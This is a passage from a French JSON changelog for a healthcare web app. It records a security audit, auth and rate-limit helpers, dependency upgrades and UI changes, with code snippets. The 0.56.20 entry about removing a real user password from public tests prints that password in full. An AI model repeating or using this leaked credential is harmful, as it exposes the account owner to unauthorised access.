      { "code": "AI", "txt": "+13 tests Vitest dédiés au saut (test file v057-0-next15-react19.test.js) : versions package (4 : 0.57.x, next>=15, react>=19, react-dom>=19), 7 pages dynamiques avec useParams (7 : matériel, patient ×3, équipe, inscription, vérifier), aucun Server Component cassé (1 : scan complet de app/), eslint-config-next aligné (1). +4 tests existants ajustés pour Next 15. Total 2311 tests verts (vs 2298)" },
      { "code": "DOC", "txt": "Plan post-0.57.0 : (0.57.1) refacto fichiers > 1000 lignes (changelog/page.js 1603, carte 1482, utilisateurs 1400, patient/[id]/edit 1065) en sous-composants — qualité maintenabilité, pas sécurité. (0.58+) migration xlsx → ExcelJS pour règler la dernière HIGH (Prototype Pollution + ReDoS pas de fix upstream)" }
    ],
    "themes": ["security", "dependencies", "infrastructure"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.0.html",
    "sqlFile": null
  },
  {
    "v": "0.56.22",
    "kind": "version",
    "titre": "🧹 Hardening 3/3 : qualité code — console.log → logger · try/catch · vitest 4",
    "chantiers": [
      { "code": "FE", "txt": "Migration de 20 occurrences de console.log/warn/error vers lib/logger sur 7 fichiers : app/carte/page.js (11), app/changelog/page.js (2), app/api/rpps/route.js (2), app/api/finess/route.js (1), app/lib/checkEtabDoublon.js (2), app/NotificationOptIn.js (1), lib/exportExcel.js (1). Le logger redacte automatiquement les valeurs sensibles (password/token/refresh_token/credential_id) et se tait en production (sauf si flag debug activé). Plus aucun risque d'exposer des infos sensibles dans la console des utilisateurs finaux lors d'une session de support ou de screen sharing",
        "code_snippet": {
          "file": "app/carte/page.js",
          "note": "Migration console → logger (extrait)",
          "lang": "js",
          "before": "console.error(\"[Carte] Erreur init Leaflet :\", e);\nconsole.warn(`[Carte RPPS] HTTP`, res.status);\nconsole.log(\"[Carte RPPS]\", prof, data.results.length, \"résultats\");",
          "after": "import { logger } from \"../../lib/logger\";\n\n// Tous les console.* sont remplacés :\nlogger.error(\"[Carte] Erreur init Leaflet :\", e);\nlogger.warn(`[Carte RPPS] HTTP`, res.status);\nlogger.info(\"[Carte RPPS]\", prof, data.results.length, \"résultats\");\n\n// Avantages :\n// - redaction automatique des secrets (password, token, etc.)\n// - silencieux en prod (sauf flag debug)\n// - centralisé : possibilité d'ajouter Sentry/Datadog plus tard"
        }
      },
      { "code": "FE", "txt": "Ajout try/catch sur 5 pages identifiées par l'audit comme sans gestion d'erreur sur leurs appels Supabase : app/admin/bulletins-archive/page.js (RPC stats + select patients), app/journal/page.js (audit_log + membres_structure), app/materiel/[id]/page.js (6 appels Promise.all : materiels + tags + materiel_tags + maintenances + interventions + transferts), app/tags-materiel/page.js (select tags_materiel), app/page.js (auth.getSession au démarrage avec .catch chaîné + fallback vers /login). En cas d'erreur réseau ou Supabase, la page n'affiche plus un écran blanc — le user reste sur un état contrôlé avec loading désactivé et log envoyé au logger",
        "code_snippet": {
          "file": "app/materiel/[id]/page.js",
          "note": "try/catch sur Promise.all des 6 fetches",
          "lang": "js",
          "before": "useEffect(() => {\n  if (!auth.ready || !matId) return;\n  (async () => {\n    const [...] = await Promise.all([\n      supabase.from(\"materiels\").select(...).single(),\n      supabase.from(\"tags_materiel\").select(\"*\"),\n      supabase.from(\"materiel_tags\")...,\n      // ... 3 autres\n    ]);\n    setMat(m || null);\n    // ... setters\n    setLoading(false);\n  })();\n}, [auth.ready, matId]);",
          "after": "useEffect(() => {\n  if (!auth.ready || !matId) return;\n  (async () => {\n    try {\n      const [...] = await Promise.all([\n        supabase.from(\"materiels\").select(...).single(),\n        // ... idem\n      ]);\n      setMat(m || null);\n      // ... setters\n    } catch (e) {\n      // 0.56.22 : try/catch pour pas planter la page\n      logger.error(\"[Materiel] load failed:\", e);\n    } finally {\n      setLoading(false);\n    }\n  })();\n}, [auth.ready, matId]);"
        }
      },
      { "code": "SEC", "txt": "Upgrade vitest 1.6 → 4.1.8 : règle la vulnérabilité CRITICAL identifiée (GHSA-5xrq-8626-4rwp : Vitest UI server arbitrary file read) + 4 vulnérabilités MODERATE (esbuild dev server, vite, vite-node). npm audit passe de 2 CRITICAL + 1 HIGH + 4 MODERATE à 0 CRITICAL + 2 HIGH + 1 MODERATE (les 2 HIGH sont les vulns Next persistantes qui nécessitent Next 16, et 1 MODERATE est xlsx prototype pollution). Tous les 2298 tests passent avec vitest 4 sans modification" },
      { "code": "AI", "txt": "+29 tests Vitest : upgrade vitest 4 (1 : version >= 4.1), migration console → logger (14 = 7 fichiers × 2 checks : import présent + plus de console.* résiduel), try/catch sur 5 pages (10 = 5 × 2 : try+catch ou .catch chaîné + import logger), logger.error dans le catch (4 = 4 pages × 1, page racine exclue car .catch chaîné). Total 2298 tests verts (vs 2269)" },
      { "code": "DOC", "txt": "Hardening 3/3 terminé. Récap de la trilogie : (0.56.20) auth + rate limit OCR + mot de passe retiré tests + patch SQL grants/search_path. (0.56.21) Next.js 14.2.5 → 14.2.35 (fix 2 CVE CRITICAL) + auth sur RPPS/FINESS/SIRENE + helper fetchWithAuth. (0.56.22) qualité code + vitest 4. Prochaine étape (optionnelle) : 0.57.0 = saut Next 16.x + React 19 pour régler les 7 vulns Next persistantes — à planifier comme une version dédiée avec recette complète" }
    ],
    "themes": ["security", "quality", "logging", "dependencies"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.22.html",
    "sqlFile": null
  },
  {
    "v": "0.56.21",
    "kind": "version",
    "titre": "🔒 Hardening 2/3 : Next.js 14.2.35 (fix 2 CVE CRITICAL) + auth sur RPPS/FINESS/SIRENE",
    "chantiers": [
      { "code": "SEC", "txt": "Upgrade Next.js 14.2.5 → 14.2.35 : règle les 2 vulnérabilités CRITICAL identifiées dans l'audit 0.56.20 — (1) GHSA-gp8f-8m3g-qvj9 Cache Poisoning via Image Optimization, (2) GHSA-7gfc-8cq8-jh5f Authorization Bypass + plusieurs HIGH (SSRF middleware, Content Injection, Race Condition Cache Poisoning, etc.). 7 vulnérabilités Next moderate/high persistent mais nécessitent un saut à Next 16.x (breaking change, à planifier séparément)" },
      { "code": "BE", "txt": "Nouveau helper lib/fetchWithAuth.js (~40 lignes) qui wrap fetch() et injecte automatiquement le header Authorization: Bearer <token> via supabase.auth.getSession(). Cache du client supabase pour éviter de le recréer à chaque appel. Si pas de session (user déconnecté ou erreur), le fetch est fait sans Authorization — la route renvoie alors 401 si protégée. Pas d'override si Authorization déjà fixé manuellement par l'appelant",
        "code_snippet": {
          "file": "lib/fetchWithAuth.js",
          "note": "Helper fetch + Bearer auto",
          "lang": "js",
          "after": "export async function fetchWithAuth(url, options = {}) {\n  let token = null;\n  try {\n    const supabase = getClient();\n    const { data } = await supabase.auth.getSession();\n    token = data?.session?.access_token || null;\n  } catch {\n    // Pas grave : on tente le fetch sans Authorization\n  }\n\n  const headers = new Headers(options.headers || {});\n  if (token && !headers.has(\"Authorization\")) {\n    headers.set(\"Authorization\", `Bearer ${token}`);\n  }\n\n  return fetch(url, { ...options, headers });\n}"
        }
      },
      { "code": "SEC", "txt": "5 routes API supplémentaires protégées par requireAuth + rate limit : /api/rpps (60 req/min, recherche RPPS via API FHIR ANS), /api/rpps/diagnostic (10/min, expose info diagnostic interne), /api/rpps/dump-status (30/min, statut dump RPPS local), /api/finess (60/min, proxy data.gouv FINESS), /api/sirene (60/min, proxy API SIRENE). Ces routes proxy des API gouvernementales et peuvent être abusées pour épuiser ton quota Vercel ou faire du scraping",
        "code_snippet": {
          "file": "app/api/rpps/route.js",
          "note": "Pattern auth + rate limit appliqué",
          "lang": "js",
          "after": "import { requireAuth, checkRateLimit } from \"../../../lib/apiAuth\";\n\nexport async function GET(req) {\n  const t0 = Date.now();\n\n  // 0.56.21 : auth obligatoire (proxy API gouv)\n  const authCheck = await requireAuth(req);\n  if (!authCheck.ok) return authCheck.response;\n  const { user } = authCheck;\n  const rate = checkRateLimit(user.id, {\n    maxRequests: 60, windowMs: 60_000\n  });\n  if (!rate.ok) return rate.response;\n\n  // ... reste de la logique\n}"
        }
      },
      { "code": "FE", "txt": "4 pages front migrent vers fetchWithAuth pour ne pas casser après l'ajout d'auth : app/components/RppsSearch.js (composant unique de recherche RPPS, utilisé sur /annuaire-rpps + /partenaires-rpps + /utilisateurs), app/RppsAutocomplete.js (autocomplete dans formulaires), app/admin/rpps-dump/page.js (2 appels : dump-status + test recherche), app/carte/page.js (6 appels : 3 sur la carte search + 3 sur les détails)" },
      { "code": "BE", "txt": "2 routes server-side qui appellent /api/rpps en interne (verify-rpps + prescriptions/from-ocr) propagent déjà le header Authorization reçu — aucun changement nécessaire, elles fonctionneront automatiquement avec le nouveau check" },
      { "code": "SEC", "txt": "Routes /api/version et /api/health restent volontairement PUBLIQUES (sans auth) : ce sont les endpoints de monitoring utilisés par Vercel + uptime checkers. Ne renvoient que des infos non-sensibles (version, statut services). À surveiller mais pas un risque de quota" },
      { "code": "AI", "txt": "+30 tests Vitest : Next upgrade (1 : version >= 14.2.35), fetchWithAuth helper (5 : export, getSession, Bearer header, pas d'override, catch erreurs), routes protégées RPPS+FINESS+SIRENE (15 = 5 routes × 3 checks : import helper, appel requireAuth, rate limit), pages front fetchWithAuth (8 = 4 callers × 2 checks : import + remplacement effectif), changelog (1). Total 2269 tests verts (vs 2239)" }
    ],
    "themes": ["security", "hardening", "dependencies", "api"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.21.html",
    "sqlFile": null
  },
  {
    "v": "0.56.20",
    "kind": "version",
    "titre": "🛡️ Audit sécurité + fixes critiques : auth obligatoire sur OCR · rate limit · SQL hardening",
    "chantiers": [
      { "code": "SEC", "txt": "AUDIT SÉCURITÉ COMPLET : scan de 223 fichiers JS/TS + 80 SQL + ~57k lignes. Identification de 2 vulnérabilités CRITICAL (Next.js 14.2.5 Cache Poisoning + Authorization bypass) + 1 HIGH (SSRF middleware) + 4 MODERATE (vitest/vite/esbuild dev only). 10 routes API sans check auth identifiées dont 3 OCR qui brûlent quota Anthropic. Clé Google Places exposée dans 4 notes HTML changelog poussées sur GitHub (AIzaSy... à régénérer). 21 fonctions SQL sans grant execute. 16 fonctions SECURITY DEFINER sans set search_path. Mot de passe utilisateur exposé dans 2 tests publics" },
      { "code": "BE", "txt": "Nouveau helper lib/apiAuth.js centralisé : requireAuth(req) lit le header Authorization Bearer, vérifie le token via supabase.auth.getUser(), retourne { ok: true, user, supabase } si OK ou { ok: false, response: Response 401 } si KO. checkRateLimit(userId, { maxRequests, windowMs }) : rate limiter en mémoire Map par user_id, retourne 429 + header Retry-After si quota dépassé. Pattern simple à appliquer sur toutes les routes API coûteuses",
        "code_snippet": {
          "file": "lib/apiAuth.js",
          "note": "Helper requireAuth + rate limit pour routes API",
          "lang": "js",
          "after": "export async function requireAuth(req) {\n  const authHeader = req.headers.get(\"authorization\") || \"\";\n  const token = authHeader.replace(/^Bearer\\s+/i, \"\").trim();\n\n  if (!token) {\n    return {\n      ok: false,\n      response: Response.json(\n        { ok: false, error: \"Non authentifié (Bearer token manquant)\" },\n        { status: 401 }\n      ),\n    };\n  }\n\n  const supabase = createClient(SUPABASE_URL, SUPABASE_ANON, {\n    global: { headers: { Authorization: `Bearer ${token}` } },\n    auth: { persistSession: false, autoRefreshToken: false },\n  });\n\n  const { data, error } = await supabase.auth.getUser(token);\n\n  if (error || !data?.user) {\n    return {\n      ok: false,\n      response: Response.json(\n        { ok: false, error: \"Token invalide ou expiré\" },\n        { status: 401 }\n      ),\n    };\n  }\n\n  return { ok: true, user: data.user, supabase, token };\n}"
        }
      },
      { "code": "SEC", "txt": "Route /api/ocr/bulletin-situation : ajout requireAuth + rate limit 10 OCR/min/user EN PREMIER dans POST (avant même la check ANTHROPIC_API_KEY). Sans Bearer valide → 401 immédiat. Au 11e appel/min → 429 + Retry-After 60s. Protection essentielle car chaque appel coûte ~$0.01-$0.05 sur le compte Anthropic. Idem pour /api/ocr/prescription et /api/ocr/generic",
        "code_snippet": {
          "file": "app/api/ocr/bulletin-situation/route.js",
          "note": "Auth + rate limit avant tout traitement",
          "lang": "js",
          "before": "export async function POST(req) {\n  const t0 = Date.now();\n  const apiKey = process.env.ANTHROPIC_API_KEY;\n  if (!apiKey) {\n    return Response.json({\n      ok: false,\n      error: \"ANTHROPIC_API_KEY non configurée\",\n    }, { status: 500 });\n  }\n  // ... pas de check auth → quota Anthropic brûlable\n}",
          "after": "import { requireAuth, checkRateLimit } from \"../../../../lib/apiAuth\";\n\nexport async function POST(req) {\n  const t0 = Date.now();\n\n  // 0.56.20 : sans Bearer valide, 401\n  const authCheck = await requireAuth(req);\n  if (!authCheck.ok) return authCheck.response;\n  const { user } = authCheck;\n\n  // 0.56.20 : 10 OCR/min/user pour éviter brûler la quota\n  const rate = checkRateLimit(user.id, { maxRequests: 10, windowMs: 60_000 });\n  if (!rate.ok) return rate.response;\n\n  const apiKey = process.env.ANTHROPIC_API_KEY;\n  if (!apiKey) { /* ... */ }\n}"
        }
      },
      { "code": "FE", "txt": "Pages /scan/bulletin-situation, /scan/prescription et /scan/ocr (generic) : envoi du token Bearer dans le header Authorization à chaque appel OCR. Le token est récupéré via supabase.auth.getSession() juste avant le fetch. Sans session valide, le token est absent et l'API renvoie 401 → l'utilisateur doit se reconnecter. La page /scan/ocr a aussi reçu l'import createClient (manquant)",
        "code_snippet": {
          "file": "app/scan/bulletin-situation/page.js",
          "note": "Envoi du token Bearer dans fetch",
          "lang": "js",
          "before": "const res = await fetch(\"/api/ocr/bulletin-situation\", {\n  method: \"POST\",\n  headers: { \"Content-Type\": \"application/json\" },\n  body: JSON.stringify({ image_base64: base64, media_type: file.type }),\n});",
          "after": "// 0.56.20 : envoyer le token pour passer requireAuth\nconst token = (await supabase.auth.getSession())\n  .data?.session?.access_token;\n\nconst res = await fetch(\"/api/ocr/bulletin-situation\", {\n  method: \"POST\",\n  headers: {\n    \"Content-Type\": \"application/json\",\n    ...(token ? { Authorization: `Bearer ${token}` } : {}),\n  },\n  body: JSON.stringify({ image_base64: base64, media_type: file.type }),\n});"
        }
      },
      { "code": "SEC", "txt": "Retrait du mot de passe utilisateur réel 'Molotof46!' qui était utilisé comme cas de test dans __tests__/v055-12-password-policy.test.js et __tests__/v055-26-security.test.js. Ces fichiers sont poussés sur GitHub publiquement → n'importe qui pouvait grep le repo et trouver le password. Remplacé par des chaînes neutres (CustomP@ss42!Strong, FakeTestPass123!) qui démontrent le même comportement (validité de la policy + redact du logger) sans exposer un secret réel" },
      { "code": "SQL", "txt": "Nouveau patch supabase/aveho-PATCH-vers-0.56.20.sql : (1) Grant execute sur 10 fonctions identifiées sans grants (mes_etablissements, mes_structures, search_patients, search_materiels, refresh_medecin_stats, etc.) + boucle DO qui détecte et grant les autres oubliées. (2) Boucle DO qui ALTER FUNCTION ... SET search_path = public, pg_temp sur toutes les fonctions SECURITY DEFINER qui n'ont pas de search_path explicite (protection contre search path injection). (3) Vérification finale : compte des fonctions encore vulnérables après patch (devrait être 0)" },
      { "code": "AI", "txt": "+19 tests Vitest : lib/apiAuth helper (6 : export requireAuth, header Bearer, 401 pas de token, 401 token invalide, checkRateLimit defaults, 429 + Retry-After), route OCR bulletin (3 : import helper, requireAuth en PREMIER, rate limit 10/min), route OCR prescription (1), route OCR generic (1), pages scan envoient Bearer (3), Molotof retiré des tests (2), patch SQL (3). Total 2239 tests verts (vs 2220)" },
      { "code": "DOC", "txt": "Plan d'action recommandé pour les versions suivantes : (0.56.21 - hardening) upgrade Next.js 14.2.5 → 14.2.34+ pour règler les 2 CRITICAL CVE + auth check sur les 7 autres routes API non protégées + rel=noopener (vérifié, déjà OK) + refacto fichiers > 1000 lignes (changelog/page.js, carte, utilisateurs, patient/edit). (0.56.22 - qualité) migration 23 console.log vers lib/logger + try/catch sur 5 pages sans gestion d'erreur + upgrade vitest 1→4. Actions immédiates user : régénérer la clé Google Places exposée + changer le mot de passe Supabase" }
    ],
    "themes": ["security", "hardening", "audit", "api"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.20.html",
    "sqlFile": "aveho-PATCH-vers-0.56.20.sql"
  },
  {
    "v": "0.56.19",
    "kind": "version",
    "titre": "👁️ Bouton </> sur chaque chantier — voir le code modifié directement dans le changelog",
    "chantiers": [
      { "code": "FE", "txt": "Nouveau composant CodeViewer (app/changelog/CodeViewer.js ~230 lignes) : popup full-screen qui affiche un snippet de code modifié/ajouté pour un chantier de version. Fond sombre #1e2a3a IDE-like, header avec nom du fichier + badge langage coloré (JS orange, SQL violet, CSS teal, TS bleu), onglets Avant/Après si comparaison disponible, bouton Copier avec feedback ✓ Copié 1.8s, bouton 'Voir sur GitHub' qui ouvre https://github.com/moloscope46-hash/aveho-ec-app/blob/main/<file>, ESC pour fermer",
        "code_snippet": {
          "file": "app/changelog/CodeViewer.js",
          "note": "Composant CodeViewer (extrait)",
          "lang": "js",
          "after": "export default function CodeViewer({ snippet, onClose }) {\n  const [copied, setCopied] = useState(false);\n  const [tab, setTab] = useState(\"after\");\n\n  useEffect(() => {\n    function onEsc(e) { if (e.key === \"Escape\") onClose(); }\n    window.addEventListener(\"keydown\", onEsc);\n    return () => window.removeEventListener(\"keydown\", onEsc);\n  }, [onClose]);\n\n  if (!snippet) return null;\n\n  const lang = snippet.lang || guessLang(snippet.file);\n  const hasBefore = !!snippet.before;\n  const code = tab === \"before\" ? snippet.before : snippet.after;\n\n  return (\n    <div onClick={onClose} style={{ position: \"fixed\", inset: 0, zIndex: 10000, background: \"rgba(20,33,49,.7)\", backdropFilter: \"blur(4px)\" }}>\n      <div onClick={(e) => e.stopPropagation()} style={{ background: \"#1e2a3a\", color: \"#e8edf2\" }}>\n        {/* Header avec fichier + langage */}\n        {/* Onglets Avant/Après */}\n        {/* Code avec coloration syntaxique */}\n        <pre><code dangerouslySetInnerHTML={{ __html: highlightCode(code, lang) }} /></pre>\n        {/* Footer : Copier + GitHub + ESC */}\n      </div>\n    </div>\n  );\n}"
        }
      },
      { "code": "FE", "txt": "Coloration syntaxique simple en regex pour JS/TS/SQL/CSS — mots-clés colorés teal #7CC8C8 (const, let, function, return, async, await pour JS / select, from, where, insert, create, function pour SQL), strings violet clair #bfa9e0, nombres orange #EF9F27, commentaires gris italique. Pas de dépendance externe (prism/highlight.js) — léger et rapide",
        "code_snippet": {
          "file": "app/changelog/CodeViewer.js",
          "note": "Coloration syntaxique en regex",
          "lang": "js",
          "after": "function highlightCode(code, lang) {\n  let html = escapeHtml(code);\n\n  // Commentaires\n  if (lang === \"sql\") {\n    html = html.replace(/(--[^\\n]*)/g,\n      '<span style=\"color:#7a8a9a;font-style:italic\">$1</span>');\n  } else {\n    html = html.replace(/(\\/\\/[^\\n]*)/g,\n      '<span style=\"color:#7a8a9a;font-style:italic\">$1</span>');\n  }\n\n  // Strings\n  html = html.replace(/(['\"`])((?:\\\\.|(?!\\1).)*)\\1/g,\n    (m) => `<span style=\"color:#bfa9e0\">${m}</span>`);\n\n  // Mots-clés selon langage\n  const keywords = lang === \"sql\"\n    ? [\"select\", \"from\", \"where\", \"create\", \"function\", ...]\n    : [\"const\", \"let\", \"function\", \"return\", \"async\", \"await\", ...];\n  const kwRegex = new RegExp(`\\\\b(${keywords.join(\"|\")})\\\\b`, \"g\");\n  html = html.replace(kwRegex,\n    '<span style=\"color:#7CC8C8;font-weight:600\">$1</span>');\n\n  // Nombres\n  html = html.replace(/\\b(\\d+(\\.\\d+)?)\\b/g,\n    '<span style=\"color:#EF9F27\">$1</span>');\n\n  return html;\n}"
        }
      },
      { "code": "FE", "txt": "Bouton </> intégré sur chaque chantier dans app/changelog/page.js — petit, monospace, fond sombre #1a2434 / texte teal #7CC8C8, hover scale(1.05). Visible UNIQUEMENT pour les chantiers qui ont un champ code_snippet (sinon caché). Le clic sur le bouton arrête la propagation pour ne pas déclencher l'ouverture de la note. Le clic sur le texte du chantier garde son comportement actuel (ouvre la note HTML)",
        "code_snippet": {
          "file": "app/changelog/page.js",
          "note": "Bouton </> avec stopPropagation + ouverture popup",
          "lang": "js",
          "after": "{hasCode && (\n  <button\n    onClick={(e) => {\n      e.stopPropagation();\n      setCodeSnippet(c.code_snippet);\n    }}\n    title=\"Voir le code modifié\"\n    style={{\n      background: \"#1a2434\",\n      color: \"#7CC8C8\",\n      border: \"none\",\n      padding: \"2px 7px\",\n      borderRadius: 4,\n      cursor: \"pointer\",\n      fontFamily: \"Consolas, monospace\",\n      fontSize: 10.5,\n      fontWeight: 700,\n      transition: \"all .15s\",\n    }}\n    onMouseEnter={(e) => {\n      e.currentTarget.style.background = \"#2a3a4e\";\n      e.currentTarget.style.transform = \"scale(1.05)\";\n    }}\n    onMouseLeave={(e) => {\n      e.currentTarget.style.background = \"#1a2434\";\n      e.currentTarget.style.transform = \"scale(1)\";\n    }}\n  >\n    <i className=\"ti ti-code\" /> {\"</>\"}\n  </button>\n)}"
        }
      },
      { "code": "FE", "txt": "Structure des chantiers étendue : chaque chantier peut désormais avoir un champ optionnel code_snippet = { file: 'chemin', note: 'description courte', lang: 'js|sql|css|ts', before: 'code avant (optionnel)', after: 'code après / ajouté' }. Si only after → la popup montre directement le code ajouté. Si before+after → onglets Avant/Après dans la popup. Format rétrocompatible (le champ est optionnel, les anciennes versions sans code_snippet n'affichent juste pas de bouton </>)" },
      { "code": "FE", "txt": "Versions 0.56.17 et 0.56.18 enrichies rétroactivement avec leurs code_snippet sur les chantiers principaux. 0.56.17 : fix hydration mounted state + retrait template_libelle. 0.56.18 : CoordonneesPanel, IdRow+copyToClipboard, chargement caisse+mutuelle parallèle, fix ContactActions cp" },
      { "code": "AI", "txt": "+12 tests Vitest : CodeViewer (8 : composant exporté, ESC ferme, onglets before/after, copy avec feedback, lien GitHub construit, coloration syntaxique JS/SQL, badge langage), Intégration changelog (4 : import, état codeSnippet, bouton </> conditionnel sur hasCode, stopPropagation au clic). Total 2216 tests verts (vs 2204)" }
    ],
    "themes": ["feature", "ui_ux", "developer", "changelog"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.19.html",
    "sqlFile": null
  },
  {
    "v": "0.56.18",
    "kind": "version",
    "titre": "📞 Coordonnées & contacts complets sur la fiche patient — boutons GPS/Tel/Mail partout",
    "chantiers": [
      { "code": "FE", "txt": "Nouvelle Panel 'Coordonnées & contacts' sur /patient/[id] (entre le header et les KPIs) regroupant TOUTES les coordonnées du patient et de ses contacts avec boutons d'action (tel/mail/GPS/web) via le composant ContactActions existant. 6 sections en grille auto-fit (280px min) : (1) Patient — téléphone portable + fixe + email + adresse, (2) Contact d'urgence — nom complet + lien de parenté + téléphone, (3) Personne de confiance — nom + téléphone, (4) Médecin traitant — nom + RPPS + téléphone, (5) Caisse — nom + type + code organisme + adresse, (6) Mutuelle — raison sociale + type + AMC + adresse",
        "code_snippet": {
          "file": "app/patient/[id]/page.js",
          "note": "Composant CoordonneesPanel (extrait)",
          "lang": "js",
          "after": "function CoordonneesPanel({ pat, caisseInfo, mutuelleInfo }) {\n  if (!pat) return null;\n\n  // Entité patient construite à partir des colonnes \"patients\"\n  const patientEntity = {\n    telephone: pat.telephone_portable || pat.telephone_fixe,\n    email: pat.email,\n    adresse: pat.adresse,\n    code_postal: pat.code_postal,\n    ville: pat.ville,\n  };\n\n  return (\n    <div style={{ background: \"#fff\", border: \"1px solid #e3e9ee\", borderRadius: 12, padding: \"16px 18px\", marginTop: 14 }}>\n      <h2><i className=\"ti ti-address-book\" /> Coordonnées & contacts</h2>\n\n      <div style={{ display: \"grid\", gridTemplateColumns: \"repeat(auto-fit, minmax(280px, 1fr))\", gap: 12 }}>\n        {/* Patient */}\n        <CoordRow icon=\"ti-user\" color=\"#185FA5\" label=\"Patient\" entity={patientEntity} />\n        {/* Urgence */}\n        {pat.contact_urgence_telephone && (\n          <CoordRow icon=\"ti-alert-triangle\" color=\"#c0392b\"\n            label={`Urgence : ${pat.contact_urgence_nom}`}\n            entity={{ telephone: pat.contact_urgence_telephone }} />\n        )}\n        {/* Caisse */}\n        {caisseInfo && (\n          <CoordRow icon=\"ti-shield-check\" color=\"#185FA5\"\n            label={`Caisse : ${caisseInfo.nom}`}\n            entity={caisseInfo} />\n        )}\n        {/* Mutuelle */}\n        {mutuelleInfo && (\n          <CoordRow icon=\"ti-heart-handshake\" color=\"#7a6fb0\"\n            label={`Mutuelle : ${mutuelleInfo.raison_sociale}`}\n            entity={mutuelleInfo} />\n        )}\n      </div>\n    </div>\n  );\n}"
        }
      },
      { "code": "FE", "txt": "Sous-section 'Identifiants administratifs' avec 4 lignes (dossier, IPP, N° Sécurité Sociale, N° Adhérent mutuelle). Chaque identifiant a un bouton 'Copier' qui utilise navigator.clipboard et affiche un feedback visuel transitoire (changement texte 'Copié !' 1.5s). Le N° SS et le N° adhérent sont affichés en police monospace pour lisibilité",
        "code_snippet": {
          "file": "app/patient/[id]/page.js",
          "note": "Composant IdRow + copyToClipboard",
          "lang": "js",
          "after": "function copyToClipboard(text, label) {\n  if (!text) return;\n  try {\n    navigator.clipboard?.writeText(text);\n    // Feedback visuel sur le bouton (change 1.5s puis revient)\n    const btn = document.activeElement;\n    if (btn?.tagName === \"BUTTON\") {\n      const old = btn.innerHTML;\n      btn.innerHTML = '<i class=\"ti ti-check\"></i> Copié !';\n      setTimeout(() => { btn.innerHTML = old; }, 1500);\n    }\n  } catch {}\n}\n\nfunction IdRow({ icon, label, value, onCopy, mono }) {\n  return (\n    <div style={{ display: \"flex\", alignItems: \"center\", gap: 8 }}>\n      <i className={`ti ${icon}`} />\n      <div style={{ flex: 1 }}>\n        <div>{label}</div>\n        <div style={{ fontFamily: mono ? \"'Consolas', monospace\" : \"inherit\" }}>{value}</div>\n      </div>\n      <button onClick={onCopy} title=\"Copier\">\n        <i className=\"ti ti-copy\" /> Copier\n      </button>\n    </div>\n  );\n}"
        }
      },
      { "code": "FE", "txt": "Composants internes CoordRow (ligne coordonnée avec borderLeft coloré + ContactActions size='sm') et IdRow (identifiant administratif avec bouton Copier). Affichage conditionnel intelligent : la Panel n'apparaît pas s'il n'y a rien à afficher, et chaque section n'apparaît que si elle a au moins une donnée à montrer" },
      { "code": "FE", "txt": "Chargement caisse + mutuelle en parallèle après le chargement du patient (Promise.all) — quand p.caisse_id ou p.mutuelle_id présent, on fetch la table correspondante avec select * pour avoir toutes les coordonnées. Pas de RPC nécessaire (lecture directe), donc résistant aux bugs RPC. Ajout de useState pour caisseInfo + mutuelleInfo",
        "code_snippet": {
          "file": "app/patient/[id]/page.js",
          "note": "Chargement parallèle caisse + mutuelle",
          "lang": "js",
          "after": "// 0.56.18 : charger en parallèle caisse + mutuelle si le patient en a une\nconst promises = [];\nif (p?.caisse_id) {\n  promises.push(\n    supabase.from(\"caisses_assurance_maladie\").select(\"*\")\n      .eq(\"id\", p.caisse_id).single()\n      .then(r => setCaisseInfo(r.data || null))\n  );\n}\nif (p?.mutuelle_id) {\n  promises.push(\n    supabase.from(\"mutuelles\").select(\"*\")\n      .eq(\"id\", p.mutuelle_id).single()\n      .then(r => setMutuelleInfo(r.data || null))\n  );\n}\nawait Promise.all(promises);\nsetLoading(false);"
        }
      },
      { "code": "BUG", "txt": "Composant ContactActions : ajout fallback entity.cp || entity.code_postal pour l'affichage de l'adresse. Les tables mutuelles et caisses_assurance_maladie utilisent toutes les deux 'cp' (pas 'code_postal'), donc le bouton GPS qui construit l'adresse depuis adresse+code_postal+ville fonctionne maintenant correctement avec ces 2 référentiels santé",
        "code_snippet": {
          "file": "app/ContactActions.js",
          "note": "Fallback cp ↔ code_postal pour le GPS",
          "lang": "js",
          "before": "const adresse = [entity.adresse, entity.code_postal, entity.ville].filter(Boolean).join(\", \");",
          "after": "// 0.56.18 : fallback cp ↔ code_postal\n// (mutuelles utilisent cp, caisses utilisent cp aussi)\nconst cp = entity.cp || entity.code_postal;\nconst adresse = [entity.adresse, cp, entity.ville].filter(Boolean).join(\", \");"
        }
      },
      { "code": "BUG", "txt": "Retrait définitif de c.template_libelle du rendu des consentements RGPD (déjà retiré du select en 0.56.17 mais l'affichage restait, ce qui ne causait pas d'erreur car undefined mais polluait). Faudra une jointure vers consentements_templates dans une future version pour avoir le libellé" },
      { "code": "AI", "txt": "+18 tests Vitest : panel CoordonneesPanel (15 : import ContactActions, état caisseInfo+mutuelleInfo, chargement parallèle, composant intégré, sections patient/urgence/confiance/médecin/caisse/mutuelle, identifiants admin avec IdRow+ti-copy, copyToClipboard, CoordRow borderLeft, template_libelle retiré), ContactActions cp fallback (2 : entity.cp||entity.code_postal, commentaire). Total 2204 tests verts (vs 2186)" }
    ],
    "themes": ["feature", "ui_ux", "patient", "contacts", "accessibility"],
    "date": "1er juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.56.18.html",
    "sqlFile": null
  },
  {
    "v": "0.56.17",
    "kind": "version",
    "titre": "🐛 Fix hydration React #418/#423 sur FAB + colonne template_libelle inexistante",
    "chantiers": [
      { "code": "BUG", "txt": "Erreurs React #418 et #423 (hydration mismatch) sur toutes les pages depuis l'introduction de FloatingActionBar en 0.56.16. Cause : le composant utilisait <style jsx> qui génère des classes hash différentes entre le rendu SSR et CSR — quand le composant est rendu via un layout serveur Next.js, les styles streamés ne matchent pas ceux du client. Crash hydration → React doit recover en re-rendant tout (#423) après le mismatch (#418)" },
      { "code": "FE", "txt": "FloatingActionBar (app/FloatingActionBar.js) : suppression complète du bloc <style jsx>, déplacement de tous les @keyframes et de la classe .fab-bar vers app/globals.css. Ajout d'un état React mounted (useState false → useEffect setMounted(true)) avec early return null si !mounted. Cette double protection (CSS globale + render différé) garantit qu'aucune divergence SSR/CSR n'apparaît à l'hydratation",
        "code_snippet": {
          "file": "app/FloatingActionBar.js",
